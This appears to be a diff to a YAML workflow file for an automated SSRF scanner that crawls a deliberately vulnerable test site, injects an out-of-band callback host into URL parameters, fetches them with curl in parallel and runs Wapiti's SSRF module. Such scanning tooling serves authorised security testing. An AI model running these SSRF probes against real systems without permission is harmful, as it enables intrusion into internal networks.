@@ -1,21 +1,18 @@
 description: Searches for SSRF vulnerabilities. Replaces query parameters of gathered URLs with 'burpcollaborator_link' and accesses them with 'curl'. Flags URLs as vulnerable if responses contain "compute.internal," indicating internal network access. Also performs an automated scan with Wapiti.
 tags: ssrf, security, bash, curl
-params: target=testphp.vulnweb.com burpcollaborator_link=gyhitxcgdojfoxhbkidywa6u4mz53xaok.oast.fun, header="Example:Blackdagger"
+params: target=testphp.vulnweb.com burpcollaborator_link=gyhitxcgdojfoxhbkidywa6u4mz53xaok.oast.fun header="Example:Blackdagger"
 # Change header without blank if you need or add authorization
-env:
-  - HOME: /root/
-  - LOG_DIR: ${HOME}/logs
-  - PATH: /usr/local/bin:${PATH}
+
 steps:
   - name: CustomSSRF-External
     command: bash
     script: |
-      gau ${target//\"} | gf ssrf | sort -u | anew | httpx | qsreplace ${burpcollaborator_link//\"} | xargs -I % -P 25 sh -c 'curl -ks "%" 2>&1 | grep "compute.internal" && echo "SSRF VULN! %" || true'
+      gau ${target} | gf ssrf | sort -u | anew | httpx | qsreplace ${burpcollaborator_link} | xargs -I % -P 25 sh -c 'curl -ks "%" 2>&1 | grep "compute.internal" && echo "SSRF VULN! %" || true'
   - name: CustomSSRF-Internal
     command: bash
     script: |
-      httpx -u ${target//\"} | katana -H ${header//\"} qurl  | gf ssrf | sort -u | anew | httpx | qsreplace $burpcollaborator_link | xargs -I % -P 25 sh -c 'curl -ks "%" 2>&1 | grep "compute.internal" && echo "SSRF VULN! %" || true'
+      httpx -u ${target} | katana -H ${header} qurl  | gf ssrf | sort -u | anew | httpx | qsreplace $burpcollaborator_link | xargs -I % -P 25 sh -c 'curl -ks "%" 2>&1 | grep "compute.internal" && echo "SSRF VULN! %" || true'
   - name: AutoSSRF
     command: bash
     script: |
-      httpx -u $target -o resSSRF_${target//\"}.txt ; wapiti -u "$(cat resSSRF_${target//\"}.txt)" -m ssrf -H ${header//\"}
+      httpx -u $target -o resSSRF_${target}.txt ; wapiti -u "$(cat resSSRF_${target}.txt)" -m ssrf -H ${header}
